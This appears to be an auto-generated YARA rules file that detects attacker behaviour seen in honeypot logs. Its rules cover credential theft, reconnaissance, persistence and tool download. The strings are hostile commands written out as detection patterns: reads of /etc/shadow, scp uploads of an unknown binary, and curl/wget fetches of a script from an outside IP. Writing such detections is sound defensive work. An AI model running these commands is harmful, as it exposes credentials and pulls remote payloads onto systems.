// LLM Honeypot Intelligence Platform - YARA Rules
// Generated: 20260327_1537
// Source: Elasticsearch honeypot data (24h window)

rule Honeypot_CredentialTheft {
    meta:
        description = "LLM Honeypot Intelligence - CredentialTheft pattern detection"
        author = "LLM Honeypot Intelligence Platform"
        date = "2026-03-27"
        source = "honeypot_auto_generated"
        confidence = "high"
        event_count = "2"
        unique_patterns = "2"
    strings:
        $s0 = "cat /etc/passwd 2>/dev/null" ascii nocase
        $s1 = "cat /etc/shadow 2>/dev/null" ascii nocase
    condition:
        any of them
}

rule Honeypot_SystemRecon {
    meta:
        description = "LLM Honeypot Intelligence - SystemRecon pattern detection"
        author = "LLM Honeypot Intelligence Platform"
        date = "2026-03-27"
        source = "honeypot_auto_generated"
        confidence = "high"
        event_count = "890"
        unique_patterns = "12"
    strings:
        $s0 = "whoami" ascii nocase
        $s1 = "cat /etc/hostname" ascii nocase
        $s2 = "hostname" ascii nocase
        $s3 = "cat /proc/version 2>/dev/null" ascii nocase
        $s4 = "nproc --all" ascii nocase
        $s5 = "lspci" ascii nocase
        $s6 = "nvidia-smi -q" ascii nocase
        $s7 = "cat /proc/cpuinfo" ascii nocase
        $s8 = "uptime -p" ascii nocase
        $s9 = "uptime" ascii nocase
        $s10 = "uname -a" ascii nocase
        $s11 = "ip addr show 2>/dev/null" ascii nocase
    condition:
        any of them
}

rule Honeypot_Persistence {
    meta:
        description = "LLM Honeypot Intelligence - Persistence pattern detection"
        author = "LLM Honeypot Intelligence Platform"
        date = "2026-03-27"
        source = "honeypot_auto_generated"
        confidence = "high"
        event_count = "2"
        unique_patterns = "1"
    strings:
        $s0 = "systemctl list-units --type=service --state=running 2>/dev/null" ascii nocase
    condition:
        any of them
}

rule Honeypot_ToolDownload {
    meta:
        description = "LLM Honeypot Intelligence - ToolDownload pattern detection"
        author = "LLM Honeypot Intelligence Platform"
        date = "2026-03-27"
        source = "honeypot_auto_generated"
        confidence = "high"
        event_count = "17"
        unique_patterns = "9"
    strings:
        $s0 = "scp -t /tmp/zbgjp0yc6izgkftm2p29n0msdb" ascii nocase
        $s1 = "scp -t /usr/bin/zbgjp0yc6izgkftm2p29n0msdb" ascii nocase
        $s2 = "scp -t /bin/zbgjp0yc6izgkftm2p29n0msdb" ascii nocase
        $s3 = "scp -t /usr/local/bin/zbgjp0yc6izgkftm2p29n0msdb" ascii nocase
        $s4 = "curl -sk https://31.57.216.121/sh" ascii nocase
        $s5 = "scp -t /dev/shm/zbgjp0yc6izgkftm2p29n0msdb" ascii nocase
        $s6 = "scp -t /var/tmp/zbgjp0yc6izgkftm2p29n0msdb" ascii nocase
        $s7 = "wget --no-check-certificate -qO- https://31.57.216.121/sh" ascii nocase
        $s8 = "scp -t ~/zbgjp0yc6izgkftm2p29n0msdb" ascii nocase
    condition:
        any of them
}